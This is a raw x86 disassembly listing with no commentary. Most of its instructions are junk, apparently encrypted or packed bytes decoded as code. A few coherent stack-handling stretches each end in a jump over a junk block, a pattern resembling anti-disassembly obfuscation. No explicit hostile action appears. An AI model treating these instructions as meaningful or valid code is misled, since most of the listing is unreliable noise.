  4021a3:	inc    edi
  4021a4:	and    DWORD PTR [ebp+0x75],esp
  4021a7:	mov    dl,0x3e
  4021a9:	xor    al,0x43
  4021ab:	imul   ecx,ecx,0xf574608a
  4021b1:	and    al,0xde
  4021b3:	mov    ebp,0xf4a35ec9
  4021b8:	adc    edi,DWORD PTR [esi]
  4021ba:	xchg   ebx,eax
  4021bb:	xchg   BYTE PTR [ecx-0x45],bl
  4021be:	popa   
  4021bf:	and    eax,0xbfdbe8fb
  4021c4:	mov    eax,DWORD PTR [edx+edi*2]
  4021c7:	cmp    al,0x76
  4021c9:	jne    0x4021c7
  4021cb:	std    
  4021cc:	push   0xd9b6275a
  4021d1:	pop    ds
  4021d2:	stc    
  4021d3:	popf   
  4021d4:	xchg   DWORD PTR [eax],edx
  4021d6:	fnstenv [edi]
  4021d8:	sub    al,0x65
  4021da:	adc    edi,ecx
  4021dc:	inc    ebx
  4021dd:	dec    ebp
  4021de:	sub    al,0x2a
  4021e0:	mov    ecx,0x78de49f8
  4021e5:	clc    
  4021e6:	mov    edi,0x6c78f3d3
  4021eb:	rol    DWORD PTR [ebx+ebx*2],1
  4021ee:	mov    esp,DWORD PTR [ebp+0x4a928f54]
  4021f4:	xor    ecx,DWORD PTR [ecx]
  4021f6:	mov    DWORD PTR [edx],edx
  4021f8:	xchg   esp,eax
  4021f9:	cmp    al,0x97
  4021fb:	mov    edi,0xda944739
  402200:	neg    DWORD PTR [eax]
  402202:	dec    ebp
  402203:	in     al,dx
  402204:	and    DWORD PTR [ebp+ebp*1-0x5e],0xdbb4df7b
  40220c:	mov    es,edi
  40220e:	addr16 (bad) 
  402213:	pop    edx
  402214:	daa    
  402215:	call   FWORD PTR [esi]
  402217:	mov    ebx,0xfb8e4234
  40221c:	dec    esi
  40221d:	cld    
  40221e:	mov    WORD PTR [ebp+0x6f],?
  402221:	jmp    0x9e2e781d
  402226:	in     eax,dx
  402227:	mov    eax,0x5a7087b1
  40222c:	std    
  40222d:	add    eax,0xaa08b994
  402232:	scas   eax,DWORD PTR es:[edi]
  402233:	cmp    dl,BYTE PTR [ebx+edi*8]
  402236:	jns    0x402269
  402238:	pusha  
  402239:	adc    BYTE PTR [ecx],dl
  40223b:	adc    ch,BYTE PTR [ebx+edx*1]
  40223e:	inc    edi
  40223f:	outs   dx,DWORD PTR ds:[esi]
  402240:	cmp    edi,eax
  402242:	loope  0x4021e5
  402244:	xchg   edi,eax
  402245:	and    eax,DWORD PTR [ebx]
  402247:	pop    ss
  402248:	or     DWORD PTR ds:0x5ca64cf4,ebp
  40224e:	xchg   edx,eax
  40224f:	dec    ecx
  402250:	fisttp WORD PTR [eax+0x1a]
  402253:	popf   
  402254:	imul   edi,edi,0x72
  402257:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402258:	and    BYTE PTR [eax],0x87
  40225b:	mov    eax,0x7ae7ddeb
  402260:	xor    ecx,DWORD PTR [eax-0x5811876b]
  402266:	sahf   
  402267:	push   0xb06f151f
  40226c:	ficomp DWORD PTR [esi+0x7a31e5d3]
  402272:	add    DWORD PTR [edx],eax
  402274:	and    al,0x7f
  402276:	fadd   st,st(5)
  402278:	sbb    eax,0x40cc9035
  40227d:	adc    al,0x90
  40227f:	pop    esi
  402280:	les    ebp,FWORD PTR [eax]
  402282:	mov    edx,0x1f94e9c4
  402287:	xor    bh,BYTE PTR [eax-0x124ed081]
  40228d:	arpl   WORD PTR [esi],di
  40228f:	cmp    DWORD PTR ds:0xd5a07189,0x68
  402296:	into   
  402297:	jno    0x402301
  402299:	mov    cl,0x14
  40229b:	or     al,0x94
  40229d:	mov    esp,0x607a220b
  4022a2:	call   0xc3c:0x281cfb6b
  4022a9:	xchg   esi,eax
  4022aa:	in     al,dx
  4022ab:	(bad)  
  4022ac:	or     al,0x80
  4022ae:	mov    ah,0xba
  4022b0:	jns    0x402328
  4022b2:	(bad)  
  4022b3:	call   0x785b79ac
  4022b8:	or     BYTE PTR [ebx+0x40ef100e],dh
  4022be:	dec    eax
  4022bf:	lods   eax,DWORD PTR ds:[esi]
  4022c0:	mov    ecx,DWORD PTR [edi-0x73d4b21f]
  4022c6:	out    dx,al
  4022c7:	inc    esp
  4022c8:	fsubr  st,st(2)
  4022ca:	rol    DWORD PTR [esi+0x1cbef8a2],1
  4022d0:	aaa    
  4022d1:	lock mov ?,WORD PTR [edi]
  4022d4:	imul   ebp,DWORD PTR [ebx+eax*8+0x4b],0x2b498395
  4022dc:	imul   ebp,DWORD PTR [ebp+0x6804f2ee],0x4340607b
  4022e6:	stos   BYTE PTR es:[edi],al
  4022e7:	das    
  4022e8:	lea    ebp,[eax+eiz*1+0x73]
  4022ec:	sti    
  4022ed:	call   0x8f35:0x8d3ffd38
  4022f4:	int3   
  4022f5:	fimul  DWORD PTR [edx-0x74af891a]
  4022fb:	inc    ebp
  4022fc:	call   0x1d8a38c
  402301:	add    BYTE PTR [eax],al
  402303:	push   DWORD PTR [eax]
  402305:	call   0x40984d
  40230a:	mov    DWORD PTR [ebp-0x4],eax
  40230d:	cmp    DWORD PTR [ebp-0x4],0x0
  402311:	lea    eax,[ebp+0x4]
  402314:	mov    DWORD PTR [ebp-0x38],eax
  402317:	je     0x40313f
  40231d:	lea    eax,[ebp-0xc]
  402320:	mov    DWORD PTR [ebp-0x30],eax
  402323:	mov    eax,DWORD PTR [ebp-0x4c]
  402326:	xor    eax,esi
  402328:	add    eax,edi
  40232a:	mov    DWORD PTR [ebp-0x34],eax
  40232d:	mov    eax,DWORD PTR [ebp-0x28]
  402330:	xor    eax,esi
  402332:	add    eax,edi
  402334:	mov    DWORD PTR [ebp-0x20],eax
  402337:	mov    eax,DWORD PTR [ebp-0x4]
  40233a:	mov    DWORD PTR [ebp-0x24],eax
  40233d:	lea    eax,[ebp-0x98]
  402343:	mov    DWORD PTR [ebp-0x8],eax
  402346:	jmp    0x4024e7
  40234b:	mov    ds:0x623e7a3a,al
  402350:	bound  esp,QWORD PTR ds:[edx-0x4a]
  402354:	fadd   DWORD PTR [ebp+0x4b]
  402357:	pop    ebx
  402358:	or     DWORD PTR [ecx],ebx
  40235a:	adc    BYTE PTR [edx-0x58181fd],bl
  402360:	jg     0x4023e0
  402362:	jle    0x4023a6
  402364:	mov    cr7,ebx
  402367:	inc    esp
  402368:	jle    0x4023e8
  40236a:	sbb    eax,0x75b86ff4
  40236f:	imul   ebx,DWORD PTR [eax+eiz*4+0x167e682a],0xffffffbe
  402377:	cmp    dh,al
  402379:	or     ch,bh
  40237b:	sub    dh,cl
  40237d:	mov    es,WORD PTR [ecx+0x68]
  402380:	fld    TBYTE PTR [ecx+0x56]
  402383:	jmp    0xd40999b8
  402388:	mov    edi,0xdd8624ba
  40238d:	mov    edi,0x8b01bf62
  402392:	repz and ch,BYTE PTR [esp+edi*2]
  402396:	adc    DWORD PTR [eax-0x4501223f],ebx
  40239c:	das    
  40239d:	jge    0x4023a7
  40239f:	cmp    bl,al
  4023a1:	ror    BYTE PTR [edx-0x2ffe6b03],1
  4023a7:	dec    esi
  4023a8:	jae    0x402414
  4023aa:	stc    
  4023ab:	dec    esi
  4023ac:	jmp    0x82178bd2
  4023b1:	icebp  
  4023b2:	int3   
  4023b3:	in     eax,dx
  4023b4:	fisubr WORD PTR [ecx+0x47]
  4023b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4023b8:	rcl    BYTE PTR [ebx+0x375c059f],1
  4023be:	fwait
  4023bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023c0:	inc    ebx
  4023c1:	ret    
  4023c2:	sub    DWORD PTR [ebx],esi
  4023c4:	add    BYTE PTR [eax+0x4],dh
  4023c7:	push   0x1d
  4023c9:	into   
  4023ca:	cmp    BYTE PTR [edi],bh
  4023cc:	sub    al,0x82
  4023ce:	jnp    0x402397
  4023d0:	mov    eax,0x146eced8
  4023d5:	das    
  4023d6:	pusha  
  4023d7:	push   ss
  4023d8:	dec    ebp
  4023d9:	add    dh,cl
  4023db:	out    dx,eax
  4023dc:	mov    eax,ds:0x95ff5b0b
  4023e1:	adc    ch,BYTE PTR [esi+0x50]
  4023e4:	leave  
  4023e5:	add    edx,ecx
  4023e7:	add    eax,0x59bb1ed4
  4023ec:	fidiv  DWORD PTR [eax-0x1a]
  4023ef:	mov    esi,DWORD PTR [edx-0x21afa12]
  4023f5:	ret    0x7833
  4023f8:	fdivr  DWORD PTR [edi]
  4023fa:	ficomp DWORD PTR [ebx]
  4023fc:	dec    ecx
  4023fd:	fisubr DWORD PTR [edi]
  4023ff:	mov    eax,DWORD PTR [ecx]
  402401:	mov    cl,0x78
  402403:	outs   dx,BYTE PTR ds:[esi]
  402404:	cmc    
  402405:	push   0x991dbd21
  40240a:	std    
  40240b:	mov    esp,ecx
  40240d:	xor    esi,DWORD PTR es:[esi]
  402410:	pop    ss
  402411:	jne    0x4023c1
  402413:	pop    ebx
  402414:	call   FWORD PTR [edi+0x3d7fd336]
  40241a:	cdq    
  40241b:	and    eax,0x58caf31c
  402420:	pop    ss
  402421:	xchg   BYTE PTR [edx+0x51],ch
  402424:	pop    DWORD PTR [edi-0x36]
  402427:	ret    
  402428:	je     0x40246a
  40242a:	sahf   
  40242b:	and    BYTE PTR [edi+ebp*4+0x74],al
  40242f:	pop    esp
  402430:	or     DWORD PTR [ecx],eax
  402432:	lock out dx,eax
  402434:	mov    dl,0xbc
  402436:	and    BYTE PTR ds:0x3aba811b,bl
  40243c:	pop    ecx
  40243d:	into   
  40243e:	cmp    BYTE PTR [esi+eax*1+0x6291db2c],bh
  402445:	sbb    al,0x33
  402447:	jg     0x402477
  402449:	xchg   ebx,eax
  40244a:	in     al,0xd7
  40244c:	jae    0x402477
  40244e:	jmp    0x58d6:0x77a0aef4
  402455:	mov    esi,0x53f07d8e
  40245a:	or     DWORD PTR [esp+esi*4],esi
  40245d:	dec    edi
  40245e:	out    dx,eax
  40245f:	ret    
  402460:	inc    esp
  402461:	mov    esi,0xfdb7f0aa
  402466:	iret   
  402467:	mov    edx,0xfd817dd7
  40246c:	or     ecx,0xffffff91
  40246f:	out    0x44,eax
  402471:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402472:	mov    BYTE PTR [ecx-0xb],bh
  402475:	xor    edi,DWORD PTR [edi+0x19e4e9ea]
  40247b:	fsub   QWORD PTR [edx]
  40247d:	and    al,0x39
  40247f:	fidivr DWORD PTR [edx+ebp*2-0x21]
  402483:	(bad)  
  402484:	mov    bl,0xf7
  402486:	xchg   esp,eax
  402487:	mov    edx,DWORD PTR [eax+ecx*2-0x1d]
  40248b:	icebp  
  40248c:	mov    edi,0xe6850e51
  402491:	icebp  
  402492:	(bad)  
  402493:	in     eax,0xa0
  402495:	jne    0x402486
  402497:	gs in  eax,dx
  402499:	xchg   ebp,eax
  40249a:	scas   eax,DWORD PTR es:[edi]
  40249b:	sub    eax,0xb125aea2
  4024a0:	and    bl,bl
  4024a2:	mov    ds:0x5e42ab77,al
  4024a7:	mov    BYTE PTR [ebp+0xc],0x5f
  4024ab:	xchg   esi,eax
  4024ac:	adc    esp,DWORD PTR [eax-0x32]
  4024af:	hlt    
  4024b0:	xor    ebx,DWORD PTR [ecx+0x6e]
  4024b3:	cdq    
  4024b4:	push   ebx
  4024b5:	(bad)  
  4024b6:	mov    ah,BYTE PTR [ebp+0x671c7476]
  4024bc:	js     0x4024e3
  4024be:	imul   esi,ebp,0x57
  4024c1:	mov    bl,0xbe
  4024c3:	cmp    DWORD PTR [esi],ebp
  4024c5:	cmp    BYTE PTR [ebp+ecx*8-0x4e],al
  4024c9:	shr    DWORD PTR [eax],1
  4024cb:	out    0xa0,al
  4024cd:	jmp    0x5625:0x42db5a3d
  4024d4:	data16 or cl,cl
  4024d7:	out    dx,al
  4024d8:	imul   bh
  4024da:	cmp    al,0x8c
  4024dc:	call   0x4b873e92
  4024e1:	push   ebp
  4024e2:	imul   DWORD PTR gs:[ebp+0x61]
  4024e6:	adc    DWORD PTR [ebx+0x4589f045],ecx
  4024ec:	lock mov eax,DWORD PTR [ebp-0x1c]
  4024f0:	mov    DWORD PTR [ebp-0x40],ebx
  4024f3:	mov    DWORD PTR [ebp-0x2c],eax
  4024f6:	mov    eax,DWORD PTR [ebp-0x40]
  4024f9:	mov    ecx,DWORD PTR [ebp-0x8]
  4024fc:	jmp    0x40269d
  402501:	push   ebp
  402502:	shl    BYTE PTR [ebp+0x7159b138],1
  402508:	push   ecx
  402509:	stos   DWORD PTR es:[edi],eax
  40250a:	rol    eax,0x47
  40250d:	scas   eax,DWORD PTR es:[edi]
  40250e:	cdq    
  40250f:	in     eax,dx
  402510:	or     ah,BYTE PTR [esi]
  402512:	add    DWORD PTR [esi+0x7e],edi
  402515:	cli    
  402516:	jg     0x402596
  402518:	jle    0x402531
  40251a:	mov    al,0xfe
  40251c:	dec    edi
  40251d:	rcl    DWORD PTR [eax-0x14],1
  402520:	cli    
  402521:	das    
  402522:	fist   WORD PTR [edi]
  402524:	or     ebx,DWORD PTR [ecx]
  402526:	push   edi
  402527:	std    
  402528:	dec    ebx
  402529:	pusha  
  40252a:	mov    esp,0x1cfba2d7
  40252f:	add    eax,0xe6a368b4
  402534:	popa   
  402535:	ss or  cl,ah
  402538:	and    DWORD PTR [esi],ebp
  40253a:	pop    edi
  40253b:	and    esp,DWORD PTR [edi+0x5c]
  40253e:	retf   0x524d
  402541:	sahf   
  402542:	or     eax,DWORD PTR [ebx-0x67]
  402545:	addr16 jo 0x4025a6
  402548:	jecxz  0x40257f
  40254a:	mov    ?,WORD PTR [esi+0x78]
  40254d:	sub    bl,bl
  40254f:	adc    BYTE PTR [ecx+0x72],0xf3
  402553:	and    ah,cl
  402555:	inc    ecx
  402556:	fadd   st(2),st
  402558:	bnd je 0x40253f
  40255b:	and    DWORD PTR [esi],esp
  40255d:	or     al,0x42
  40255f:	or     edi,0xffffffe0
  402562:	retf   0xdee3
  402565:	xchg   edi,eax
  402566:	(bad)  
  402568:	inc    edi
  402569:	adc    al,0xc6
  40256b:	test   DWORD PTR [edi],edi
  40256d:	cli    
  40256e:	or     eax,0xcff1b208
  402573:	frstorw [eax]
  402576:	and    eax,DWORD PTR [eax+0x1ca8a2ca]
  40257c:	(bad)  
  40257d:	les    ebx,FWORD PTR [ecx+0x6]
  402580:	sbb    ch,bh
  402582:	stos   DWORD PTR es:[edi],eax
  402583:	dec    esi
  402584:	in     al,0x55
  402586:	jg     0x402572
  402588:	push   0x7f
  40258a:	in     eax,dx
  40258b:	repz loopne 0x40260b
  40258e:	int3   
  40258f:	fs mov ecx,0x7ab53702
  402595:	mov    ecx,0xb968cc72
  40259a:	fnstcw WORD PTR [edx+eiz*8+0x3c2241d4]
  4025a1:	outs   dx,BYTE PTR ds:[esi]
  4025a2:	sbb    eax,0x89f7bc0e
  4025a7:	inc    esi
  4025a8:	sub    esi,DWORD PTR [esi-0x4912c0a0]
  4025ae:	aaa    
  4025af:	pusha  
  4025b0:	fs mov ebp,0x3846fce3
  4025b6:	(bad)  
  4025b8:	pop    ebx
  4025b9:	loopne 0x402588
  4025bb:	shl    dh,0x9
  4025be:	out    0x4c,al
  4025c0:	neg    esp
  4025c2:	pop    ecx
  4025c3:	sahf   
  4025c4:	sbb    DWORD PTR [ebx+0x28],edi
  4025c7:	ret    
  4025c8:	and    al,BYTE PTR [edx-0x28]
  4025cb:	xchg   edi,eax
  4025cc:	push   ebx
  4025cd:	jg     0x40257d
  4025cf:	or     ch,BYTE PTR [edi+ecx*2+0x35ceab0c]
  4025d6:	out    dx,eax
  4025d7:	jnp    0x402573
  4025d9:	push   0x54
  4025db:	fxch   st(6)
  4025dd:	dec    ebx
  4025de:	bound  esp,QWORD PTR [eax+0x46]
  4025e1:	in     eax,dx
  4025e2:	mov    esp,0xe44b355f
  4025e7:	rol    DWORD PTR [ecx-0x24812a6f],cl
  4025ed:	xchg   edi,eax
  4025ee:	cs inc esp
  4025f0:	mov    dh,0xb8
  4025f2:	iret   
  4025f3:	das    
  4025f4:	mov    ecx,DWORD PTR [ecx-0x50]
  4025f7:	mov    ch,0xb9
  4025f9:	call   0xd3d0c025
  4025fe:	and    bl,BYTE PTR [esi+0x3ca2c56b]
  402604:	addr16 push 0xffffffa7
  402607:	jle    0x402618
  402609:	pcmpgtb mm5,QWORD PTR [ecx+0x41]
  40260d:	dec    ebx
  40260e:	mov    ebp,0x447bcb2b
  402613:	mov    dl,0x9e
  402615:	sahf   
  402616:	add    edx,DWORD PTR [edx]
  402618:	push   ebx
  402619:	xchg   BYTE PTR [ebx],al
  40261b:	cmp    edi,ecx
  40261d:	je     0x402657
  40261f:	jle    0x402647
  402621:	stos   BYTE PTR es:[edi],al
  402622:	in     al,0x54
  402624:	xchg   BYTE PTR [ebx+0x19370495],ah
  40262a:	repz xrelease mov BYTE PTR [eax],0x6f
  40262f:	mov    bh,0xe8
  402631:	or     BYTE PTR [ebp+0x3ede26db],dh
  402637:	scas   eax,DWORD PTR es:[edi]
  402638:	stc    
  402639:	or     al,0x7b
  40263b:	xlat   BYTE PTR ds:[ebx]
  40263c:	shr    BYTE PTR [esi+0x3e],0x6b
  402640:	sar    BYTE PTR [ebp+0x389543bf],0xeb
  402647:	std    
  402648:	jne    0x40263d
  40264a:	in     eax,0x5a
  40264c:	add    bl,dl
  40264e:	mov    eax,ds:0x58e64f01
  402653:	push   ecx
  402654:	mov    dh,0x5d
  402656:	test   eax,0xa4d18abb
  40265b:	aam    0x17
  40265d:	loopne 0x4026be
  40265f:	cmp    al,0xac
  402661:	pop    ebx
  402662:	call   0xef18:0xd4b19c51
  402669:	push   0xfbb14f3
  40266e:	ret    
  40266f:	xchg   esi,eax
  402670:	jo     0x4026ba
  402672:	jb     0x402675
  402674:	pop    ds
  402675:	loop   0x40268c
  402677:	adc    eax,0x924aac6b
  40267c:	sub    BYTE PTR [ecx],cl
  40267e:	js     0x4026ce
  402680:	jl     0x4026bc
  402682:	push   es
  402683:	cli    
  402684:	mov    ds:0xb1ffc933,al
  402689:	ret    
  40268a:	idiv   ah
  40268c:	shl    DWORD PTR [ecx+edi*1-0x5a1bf7cf],0x9a
  402694:	push   ss
  402695:	mov    WORD PTR [ecx-0x4],?
  402698:	gs pop ebx
  40269a:	mov    ebx,0xc633d411
  40269f:	add    eax,0x32729b
  4026a4:	mov    DWORD PTR [ecx],eax
  4026a6:	mov    eax,DWORD PTR [ebp-0x24]
  4026a9:	mov    ecx,DWORD PTR [ebp-0x8]
  4026ac:	mov    DWORD PTR [ecx+0x4],eax
  4026af:	mov    eax,DWORD PTR [ebp-0x20]
  4026b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b5:	mov    DWORD PTR [ecx+0x8],eax
  4026b8:	mov    eax,DWORD PTR [ebp-0x34]
  4026bb:	mov    ecx,DWORD PTR [ebp-0x8]
  4026be:	mov    DWORD PTR [ecx+0xc],eax
  4026c1:	jmp    0x402862
  4026c6:	les    ecx,FWORD PTR [eax+0x5552d502]
  4026cc:	ror    DWORD PTR [ecx-0x7d59e5d1],1
  4026d2:	(bad)  
  4026d3:	je     0x4026be
  4026d5:	push   ecx
  4026d6:	mov    ds:0xfa7e7e0e,al
  4026db:	jg     0x40275b
  4026dd:	jle    0x40273b
  4026df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026e0:	sub    edx,edx
  4026e2:	je     0x40272f
  4026e4:	push   0xffffff85
  4026e6:	add    bh,BYTE PTR [ecx]
  4026e8:	nop
  4026e9:	mov    ds:0x6555f732,eax
  4026ee:	aam    0x63
  4026f0:	inc    ebx
  4026f1:	cmp    dl,dh
  4026f3:	sar    BYTE PTR [ecx+edx*4],cl
  4026f6:	mov    ecx,0x61ac4d90
  4026fb:	dec    ecx
  4026fc:	add    eax,0x470a7242
  402701:	pop    es
  402702:	repnz inc ebp
  402704:	lea    ebx,[eax+0x2b]
  402707:	out    0x8e,eax
  402709:	fld    st(3)
  40270b:	fisubr WORD PTR [ecx+esi*1-0x6b]
  40270f:	dec    ecx
  402710:	int    0xc5
  402712:	idiv   BYTE PTR [edx+0x7c84ac0c]
  402718:	loopne 0x4026a0
  40271a:	pusha  
  40271b:	mov    eax,0x3b93506f
  402720:	and    eax,0x13cf2192
  402725:	jmp    DWORD PTR [eax]
  402727:	jno    0x40272f
  402729:	push   esi
  40272a:	cmp    eax,0x3da57dc1
  40272f:	or     bl,BYTE PTR [ecx]
  402731:	xor    bh,bh
  402733:	add    BYTE PTR [ebp+0x3bc041e9],al
  402739:	call   0xc1513a42
  40273e:	loope  0x4026f1
  402740:	inc    esi
  402741:	mov    WORD PTR [eax],?
  402743:	jmp    0xe4e003e6
  402748:	scas   eax,DWORD PTR es:[edi]
  402749:	iret   
  40274a:	repnz sbb ecx,edx
  40274d:	into   
  40274e:	dec    edx
  40274f:	mov    eax,ds:0x38eb988
  402754:	aad    0x8d
  402756:	cmp    BYTE PTR [esi+0x7c],ch
  402759:	push   esi
  40275a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40275b:	fcmovbe st,st(3)
  40275d:	mov    ch,0x21
  40275f:	je     0x402701
  402761:	ret    0x8e7d
  402764:	loope  0x402742
  402766:	mov    cl,BYTE PTR [edi]
  402768:	enter  0x23d,0xfe
  40276c:	scas   al,BYTE PTR es:[edi]
  40276d:	sub    BYTE PTR [ebp+0x6f],0x5
  402771:	xchg   ebp,eax
  402772:	loop   0x4027bc
  402774:	pop    ds
  402775:	cmc    
  402776:	inc    ecx
  402777:	add    dl,BYTE PTR [edx]
  402779:	push   eax
  40277a:	xchg   edi,eax
  40277b:	bound  esp,QWORD PTR [ebx]
  40277d:	jg     0x40277d
  40277f:	cmp    eax,0xed3a6dd6
  402784:	in     al,dx
  402785:	lds    edi,FWORD PTR [eax+0x7a6c7bdc]
  40278b:	xor    cl,BYTE PTR [esi]
  40278d:	into   
  40278e:	pop    ebx
  40278f:	xor    DWORD PTR ds:0x61b7ab36,0x2
  402796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402797:	sub    al,0xca
  402799:	and    BYTE PTR [ebp+0x4b6e18d6],dh
  40279f:	daa    
  4027a0:	cmc    
  4027a1:	loopne 0x4027b5
  4027a3:	aas    
  4027a4:	add    al,0x19
  4027a6:	add    BYTE PTR [ebx],ah
  4027a8:	test   eax,0x37a6ff1f
  4027ad:	inc    ebp
  4027ae:	push   ebx
  4027af:	ds jle 0x402831
  4027b2:	test   eax,0x55c24cb
  4027b7:	repnz or DWORD PTR [ebp-0x1],esi
  4027bb:	xchg   esp,eax
  4027bc:	popf   
  4027bd:	imul   esp,DWORD PTR [esi+0x704c8a63],0xffffffa9
  4027c4:	cmp    bl,0xb0
  4027c7:	sbb    BYTE PTR [eax-0x70917410],0xbc
  4027ce:	adc    al,0xe1
  4027d0:	sbb    al,0x58
  4027d2:	rol    DWORD PTR [ebp-0x382f16e5],cl
  4027d8:	mov    ds:0x37b7b7,eax
  4027dd:	cmp    BYTE PTR [edi-0x32],ch
  4027e0:	je     0x402772
  4027e2:	stos   BYTE PTR es:[edi],al
  4027e3:	sub    DWORD PTR [esp+ebp*2],0x15b68ef6
  4027ea:	(bad)  
  4027eb:	jae    0x402856
  4027ed:	inc    ebx
  4027ee:	out    dx,eax
  4027ef:	mov    al,0x17
  4027f1:	std    
  4027f2:	mov    WORD PTR [edx+eiz*8],ds
  4027f5:	sbb    dh,BYTE PTR [eax+0x1c5eba33]
  4027fb:	add    ah,BYTE PTR [edx+0x728133c9]
  402801:	add    dl,BYTE PTR ds:0xee773537
  402807:	repnz mov ah,BYTE PTR ds:0xab8efa38
  40280e:	jg     0x402841
  402810:	sbb    eax,0x98faa7b7
  402815:	or     bl,ah
  402817:	xchg   DWORD PTR [eax],edx
  402819:	dec    esp
  40281a:	xor    ebp,DWORD PTR [ecx]
  40281c:	retf   
  40281d:	mov    al,ds:0x721849e2
  402822:	dec    ebp
  402823:	jne    0x4027d5
  402825:	push   ecx
  402826:	(bad)  
  402827:	ss pop ecx
  402829:	ret    0x3d8e
  40282c:	rcl    BYTE PTR [edx+0x14],0x4a
  402830:	icebp  
  402831:	popa   
  402832:	dec    ebp
  402833:	mov    dl,0xbd
  402835:	pop    ebp
  402836:	fild   WORD PTR [edi]
  402838:	cmp    eax,0x51110d5f
  40283d:	cs sahf 
  40283f:	sbb    dh,BYTE PTR [edx+eiz*8+0x23965ccf]
  402846:	scas   al,BYTE PTR es:[edi]
  402847:	xchg   edi,eax
  402848:	hlt    
  402849:	jecxz  0x4027fc
  40284b:	or     BYTE PTR [ecx],bh
  40284d:	out    dx,eax
  40284e:	lods   eax,DWORD PTR ds:[esi]
  40284f:	adc    ebp,DWORD PTR [eax+0x5ed03f0]
  402855:	mov    ds:0x8b688269,al
  40285a:	sub    ecx,ebx
  40285c:	sbb    DWORD PTR ds:0x469cc05f,esp
  402862:	mov    eax,DWORD PTR [ebp-0x30]
  402865:	mov    ecx,DWORD PTR [ebp-0x8]
  402868:	mov    DWORD PTR [ecx+0x10],eax
  40286b:	mov    eax,eax
  40286d:	mov    eax,DWORD PTR [ebp-0x24]
  402870:	test   eax,eax
  402872:	jmp    0x402a13
  402877:	inc    edi
  402878:	push   eax
  402879:	jnp    0x402883
  40287b:	or     DWORD PTR [ecx+0x55],edx
  40287e:	push   ecx
  40287f:	adc    BYTE PTR [ebx],ch
  402881:	nop
  402882:	dec    esp
  402883:	cmc    
  402884:	out    0x3e,al
  402886:	(bad)  
  402887:	cs or  al,0x7e
  40288a:	jle    0x402886
  40288c:	jg     0x40290c
  40288e:	jle    0x4028ba
  402890:	mov    cl,0xd9
  402892:	das    
  402893:	bound  ecx,QWORD PTR [edi]
  402895:	pop    ecx
  402896:	add    eax,0x2b262d4e
  40289b:	xchg   ebx,eax
  40289c:	stos   BYTE PTR es:[edi],al
  40289d:	push   ecx
  40289e:	jns    0x402853
  4028a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028a1:	jns    0x402844
  4028a3:	xchg   edx,eax
  4028a4:	or     eax,0xfa732182
  4028a9:	jae    0x402833
  4028ab:	(bad)  [ebp+0x3be7eef9]
  4028b1:	xlat   BYTE PTR ds:[ebx]
  4028b2:	mov    fs,WORD PTR [eax]
  4028b4:	test   ebp,ebp
  4028b6:	adc    al,0xf4
  4028b8:	hlt    
  4028b9:	out    0xf4,al
  4028bb:	and    DWORD PTR [ecx+0x9],esp
  4028be:	sbb    eax,0x83125794
  4028c3:	dec    ebx
  4028c4:	mov    gs,WORD PTR [ebx-0x24bf04b0]
  4028ca:	push   ebp
  4028cb:	jp     0x4028e7
  4028cd:	push   eax
  4028ce:	bound  edi,QWORD PTR ds:0xd79e0dc1
  4028d4:	pop    edx
  4028d5:	cmp    esp,DWORD PTR [edx+0x7b8e8fd2]
  4028db:	call   0x8b59:0x8a1d4d75
  4028e2:	pop    ebp
  4028e3:	mov    dl,BYTE PTR [edi]
  4028e5:	jg     0x40294f
  4028e7:	mov    ebx,0x3d5e1295
  4028ec:	shr    BYTE PTR [ecx],0x88
  4028ef:	ficom  DWORD PTR [ecx]
  4028f1:	mov    WORD PTR [esi-0x14],fs
  4028f4:	(bad)  [eax]
  4028f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028f7:	daa    
  4028f8:	dec    esi
  4028f9:	cdq    
  4028fa:	pusha  
  4028fb:	aad    0x41
  4028fd:	cmp    bl,BYTE PTR [ebp-0x78e3b0bc]
  402903:	push   ecx
  402904:	push   ss
  402905:	xchg   edx,eax
  402906:	int3   
  402907:	inc    BYTE PTR [eax]
  402909:	adc    ch,BYTE PTR [ebx]
  40290b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40290c:	or     eax,0x724567ed
  402911:	scas   eax,DWORD PTR es:[edi]
  402912:	out    0xe4,eax
  402914:	cmc    
  402915:	xchg   DWORD PTR [eax+ebx*1+0x36],ebp
  402919:	stos   DWORD PTR es:[edi],eax
  40291a:	out    0x79,al
  40291c:	add    dh,BYTE PTR [ecx+edx*1+0x33d6810f]
  402923:	push   edx
  402924:	jge    0x4028fe
  402926:	add    BYTE PTR [eax],ah
  402928:	push   ds
  402929:	ret    0xb90e
  40292c:	mov    BYTE PTR [esi],ch
  40292e:	lods   eax,DWORD PTR ds:[esi]
  40292f:	push   eax
  402930:	or     al,BYTE PTR [edx-0x8b23f99]
  402936:	cmc    
  402937:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402938:	mov    bl,0x94
  40293a:	mov    ds,WORD PTR [edx]
  40293c:	jge    0x4028fe
  40293e:	ret    
  40293f:	push   ebp
  402940:	push   esp
  402941:	mov    esi,0x61e19d2b
  402946:	jb     0x4029bc
  402948:	xlat   BYTE PTR ds:[ebx]
  402949:	outs   dx,BYTE PTR ds:[esi]
  40294a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40294b:	in     eax,dx
  40294c:	dec    edi
  40294d:	mov    eax,0xce419347
  402952:	retf   
  402953:	jmp    0x402935
  402955:	xor    ebp,DWORD PTR [esi]
  402957:	lods   eax,DWORD PTR ds:[esi]
  402958:	in     al,0x96
  40295a:	and    DWORD PTR [edx-0x1ed0071b],edx
  402960:	je     0x402907
  402962:	retf   0x54d4
  402965:	(bad)  
  402966:	mov    al,ds:0xbde948e1
  40296b:	mov    edi,0x17e7f4c4
  402970:	les    esp,FWORD PTR [ebp+0x33]
  402973:	gs push ebx
  402975:	iret   
  402976:	and    esi,ebx
  402978:	push   0xb15aa46b
  40297d:	jmp    DWORD PTR [ebx-0x5b3827b5]
  402983:	cmp    al,0xf4
  402985:	ficomp WORD PTR [eax]
